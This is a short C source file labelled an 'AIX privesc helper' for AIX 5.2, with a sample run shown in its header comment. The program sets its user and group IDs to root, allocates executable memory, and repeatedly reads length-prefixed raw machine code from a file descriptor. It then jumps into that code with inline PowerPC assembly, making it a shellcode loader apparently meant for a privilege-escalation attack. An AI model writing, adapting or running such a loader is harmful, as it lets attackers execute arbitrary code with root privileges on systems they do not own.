/*

AIX privesc helper

(aix 5.2) $ echo -e "\x00\x00\x00\x04\x7f\xe0\x00\x08" | ./aix52_privesc 0
Trace/BPT trap (core dumped)
(aix 5.2) $ 

*/

#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>

#define MMAP_SZ 0x10000

int
main(int argc, char **argv)
{
    int fd;
    char *p;

    if (argc != 2)
        return 0;

    fd = atoi(argv[1]);
    
    setuid(0);
    setgid(0);

    p = (char *) mmap(0, MMAP_SZ, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANON, -1, 0);
    if (p == (void *) -1)
        return 0;
    
    while (1)
    {
        int n;
        int i;
        char *m = p;
        void (*f)() = (void (*)()) p;

        read(fd, &n, 4);
        i = n;
        while(i)
        {
            int r;
            r = read(fd, m, i);
            if (r == -1)
                return 0;
            i -= r;
            m += r;
        }
        sync();
        __asm__ volatile (  "lwz 30, %0 \n\t"
                            "mtlr %1    \n\t"
                            "blr        \n\t"
                            : : "g" (fd), "r" (p) );

        /* f(); XXX: that stupid function pointer bug on gcc */
    }

    return 0;
}
